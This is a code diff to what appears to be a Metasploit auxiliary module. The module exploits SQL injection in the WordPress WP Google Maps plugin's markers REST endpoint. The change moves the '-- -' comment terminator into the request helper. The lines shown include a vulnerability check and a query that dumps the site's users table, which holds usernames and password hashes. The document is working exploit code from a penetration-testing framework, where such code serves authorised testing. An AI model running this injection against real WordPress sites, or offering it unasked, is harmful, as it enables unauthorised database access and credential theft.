@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri'      => normalize_uri(target_uri.path, '/wp-json/wpgmza/v1/markers/'),
         'vars_get' => {
           'filter' => '{}',
-          'fields' => sql_query,
+          'fields' => "#{sql_query}-- -",
         }
       )
 
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    if send_sql_request('0xABCDABCD+0xABCDABCD-- -').include? '5764765594'
+    if send_sql_request('0xABCDABCD+0xABCDABCD').include? '5764765594'
       Exploit::CheckCode::Vulnerable
     else
       Exploit::CheckCode::Unknown
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...")
 
     # Commas can't be used in the injection, so fetch all the columns
-    res = send_sql_request("* from #{datastore['DB_PREFIX']}users-- -")
+    res = send_sql_request("* from #{datastore['DB_PREFIX']}users")
 
     if res == '[]'
       print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
